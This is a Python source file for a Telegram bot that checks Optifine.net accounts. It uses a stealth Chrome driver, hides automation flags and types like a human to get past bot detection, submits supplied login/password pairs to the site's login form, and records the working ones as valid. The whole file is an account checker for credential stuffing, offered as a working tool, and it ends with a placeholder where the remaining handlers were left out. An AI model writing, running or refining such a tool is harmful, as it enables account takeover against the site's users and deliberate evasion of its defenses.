import os
import logging
import asyncio
import aiofiles
import time
import random
from datetime import datetime
from typing import Dict, List, Tuple
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфиг
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА! Установи BOT_TOKEN в переменных окружения")
    exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'start_time': datetime.now()
}

class OptifineChecker:
    """Проверка аккаунтов на Optifine.net с undetected-chromedriver"""
    
    def __init__(self):
        self.driver = None
        self.init_driver()
    
    def init_driver(self):
        """Инициализация драйвера"""
        try:
            options = uc.ChromeOptions()
            
            # Основные настройки для скрытности
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-gpu')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--start-maximized')
            options.add_argument('--disable-extensions')
            options.add_argument('--disable-plugins')
            options.add_argument('--disable-images')
            options.add_argument('--disable-javascript')  # Отключаем для скорости, если не нужен JS
            
            # Скрываем автоматизацию
            options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
            
            # Headless режим для сервера
            options.add_argument('--headless=new')
            
            self.driver = uc.Chrome(options=options, version_main=114)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            logger.info("✅ Драйвер инициализирован")
            
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации драйвера: {e}")
            self.driver = None
    
    def human_like_delay(self, min_sec=1, max_sec=3):
        """Человекоподобная задержка"""
        time.sleep(random.uniform(min_sec, max_sec))
    
    def human_like_typing(self, element, text):
        """Имитация печати человека"""
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.05, 0.15))
    
    async def check_account(self, login: str, password: str) -> Dict:
        """Проверка одного аккаунта через Selenium"""
        
        logger.info(f"🔍 Начинаю проверку: {login[:20]}...")
        
        if not self.driver:
            self.init_driver()
            if not self.driver:
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Драйвер не инициализирован'
                }
        
        try:
            # МЕТОД 1: Прямая проверка через профиль
            if len(login) < 20 and all(c.isalnum() or c == '_' for c in login):
                try:
                    self.driver.get(f"https://optifine.net/profile/{login}")
                    self.human_like_delay(2, 4)
                    
                    # Сохраняем скриншот для отладки
                    self.driver.save_screenshot(f"debug_profile_{login[:10]}.png")
                    
                    page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
                    
                    if "not found" not in page_text and "error" not in page_text:
                        logger.info(f"✅ Найден профиль: {login}")
                        return {
                            'login': login,
                            'password': password,
                            'status': 'valid',
                            'method': 'profile_check'
                        }
                except Exception as e:
                    logger.error(f"Ошибка при проверке профиля: {e}")
            
            # МЕТОД 2: Проверка через страницу входа
            try:
                # Заходим на главную
                self.driver.get("https://optifine.net")
                self.human_like_delay(3, 5)
                
                # Ищем ссылку на логин
                try:
                    login_link = self.driver.find_element(By.LINK_TEXT, "Login")
                    login_link.click()
                except:
                    try:
                        login_link = self.driver.find_element(By.PARTIAL_LINK_TEXT, "Sign in")
                        login_link.click()
                    except:
                        # Если нет ссылки, идем напрямую
                        self.driver.get("https://optifine.net/login")
                
                self.human_like_delay(2, 4)
                
                # Сохраняем скриншот страницы входа
                self.driver.save_screenshot(f"debug_login_{login[:10]}.png")
                
                # Сохраняем HTML для анализа
                with open(f"debug_login_{login[:10]}.html", 'w', encoding='utf-8') as f:
                    f.write(self.driver.page_source)
                
                # Ищем форму входа
                form_selectors = [
                    "//form",
                    "//form[contains(@action, 'login')]",
                    "//form[contains(@class, 'login')]",
                    "//form[contains(@id, 'login')]"
                ]
                
                form = None
                for selector in form_selectors:
                    try:
                        form = self.driver.find_element(By.XPATH, selector)
                        if form:
                            logger.info(f"✅ Найдена форма по селектору: {selector}")
                            break
                    except:
                        continue
                
                if not form:
                    logger.warning("❌ Форма входа не найдена")
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Форма входа не найдена'
                    }
                
                # Ищем поля ввода
                username_field = None
                password_field = None
                
                # Поиск поля логина
                username_selectors = [
                    "//input[@type='email']",
                    "//input[@type='text']",
                    "//input[@name='username']",
                    "//input[@name='email']",
                    "//input[@name='login']",
                    "//input[@placeholder*='email']",
                    "//input[@placeholder*='username']"
                ]
                
                for selector in username_selectors:
                    try:
                        username_field = form.find_element(By.XPATH, selector)
                        if username_field and username_field.is_displayed():
                            logger.info(f"✅ Найдено поле логина: {selector}")
                            break
                    except:
                        continue
                
                # Поиск поля пароля
                password_selectors = [
                    "//input[@type='password']",
                    "//input[@name='password']",
                    "//input[@placeholder*='password']"
                ]
                
                for selector in password_selectors:
                    try:
                        password_field = form.find_element(By.XPATH, selector)
                        if password_field and password_field.is_displayed():
                            logger.info(f"✅ Найдено поле пароля: {selector}")
                            break
                    except:
                        continue
                
                if not username_field or not password_field:
                    logger.warning("❌ Поля ввода не найдены")
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Поля ввода не найдены'
                    }
                
                # Очищаем поля
                username_field.clear()
                password_field.clear()
                
                # Вводим данные с имитацией человека
                self.human_like_typing(username_field, login)
                self.human_like_delay(0.5, 1)
                self.human_like_typing(password_field, password)
                self.human_like_delay(0.5, 1)
                
                # Ищем кнопку отправки
                submit_selectors = [
                    "//button[@type='submit']",
                    "//input[@type='submit']",
                    "//button[contains(text(), 'Login')]",
                    "//button[contains(text(), 'Sign in')]",
                    "//button[contains(text(), 'Log in')]"
                ]
                
                submit_button = None
                for selector in submit_selectors:
                    try:
                        submit_button = form.find_element(By.XPATH, selector)
                        if submit_button:
                            logger.info(f"✅ Найдена кнопка: {selector}")
                            break
                    except:
                        continue
                
                if not submit_button:
                    logger.warning("❌ Кнопка отправки не найдена")
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Кнопка не найдена'
                    }
                
                # Нажимаем кнопку
                submit_button.click()
                self.human_like_delay(4, 6)
                
                # Проверяем результат
                current_url = self.driver.current_url
                page_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
                
                # Сохраняем результат
                self.driver.save_screenshot(f"debug_result_{login[:10]}.png")
                
                # Критерии успеха
                success_urls = ['dashboard', 'profile', 'account', 'home']
                success_texts = ['welcome', 'dashboard', 'profile', 'logout', 'log out']
                
                if any(url in current_url.lower() for url in success_urls) or \
                   any(text in page_text for text in success_texts):
                    logger.info(f"✅ НАЙДЕН РАБОЧИЙ: {login[:20]}")
                    return {
                        'login': login,
                        'password': password,
                        'status': 'valid',
                        'method': 'login_success'
                    }
                
                # Критерии ошибки
                error_texts = ['invalid', 'incorrect', 'wrong', 'error', 'failed', 'not found']
                
                if any(text in page_text for text in error_texts):
                    logger.info(f"❌ Неверный: {login[:20]}")
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Неверный логин/пароль'
                    }
                
                # Если неопределенный результат
                logger.info(f"⚠️ Неопределенный результат для {login[:20]}")
                return {
                    'login': login,
                    'status': 'invalid',
                    'error': 'Неопределенный результат'
                }
                
            except Exception as e:
                logger.error(f"Ошибка при входе: {e}")
                return {
                    'login': login,
                    'status': 'error',
                    'error': str(e)[:50]
                }
            
        except Exception as e:
            logger.error(f"❌ Ошибка при проверке {login[:20]}: {e}")
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:50]
            }
    
    def close(self):
        """Закрытие драйвера"""
        if self.driver:
            try:
                self.driver.quit()
                logger.info("✅ Драйвер закрыт")
            except:
                pass

# Создаем экземпляр
checker = OptifineChecker()

# ... (остальной код остается тем же - функции process_file, start, button_callback, handle_document)